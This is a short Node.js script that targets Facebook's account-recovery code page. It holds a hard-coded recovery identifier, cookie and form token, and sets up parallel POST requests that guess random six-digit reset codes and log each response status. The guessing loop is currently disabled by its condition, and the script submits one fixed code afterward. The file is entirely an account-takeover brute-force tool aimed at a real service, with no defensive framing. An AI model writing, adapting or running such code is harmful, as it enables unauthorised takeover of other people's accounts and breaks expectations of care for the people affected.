'use strict';

const log = console.log.bind(console);
const Http2Client = require('./http2-client');
const helpers = require('./helpers');
const child_process = require('node:child_process');
const fs = require('node:fs');

const { rand } = helpers;

const httpClient = new Http2Client(false);

const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';

(async () => {
  const url = 'https://www.facebook.com/recover/code/?cuid=AYjPF4howRxW5KfMlzxUKBkIu6QB1Ktq8kERKAjtnY6mLDLwAhrxFKsYtBBkiuYLj7ErX-5NeKyasyyljWyT3JH68MRRrRpyw3SXefMqGw1o7fn514XvV3k6TN7-_cEt23AOl67b5Ep0kHH1pnEvW6xbZbkc9W3mw9H5D4gAoEDFmo3o4JKQwillO9mCMM9GkRDf6PoB0oz3dsi-lKuAFyCnP1u8IO78YePW28AEalScHQ';
  const headers = {
    'Cookie': 'datr=LS4uaKqjexvPknJhuSVD1BWM',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': USER_AGENT,
    'Sec-Fetch-Site': 'same-origin'
  };
  // const codes = require('./codes');

  // child_process.exec('siren warn');

  const p = [];
  for (let i = 0, code; 0 > i; ++i) {
    code = rand(111111, 999999);
    p.push(new Promise(r => httpClient.post(url, headers, 'lsd=AVrCihG3UJY&n='+code).then(res => (log(res.statusCode), r()))));
  }

  Promise.all(p).then(() => {
    httpClient.post(url, headers, 'lsd=AVrCihG3UJY&n=896475').then(res => log(res.statusCode));
  });
})();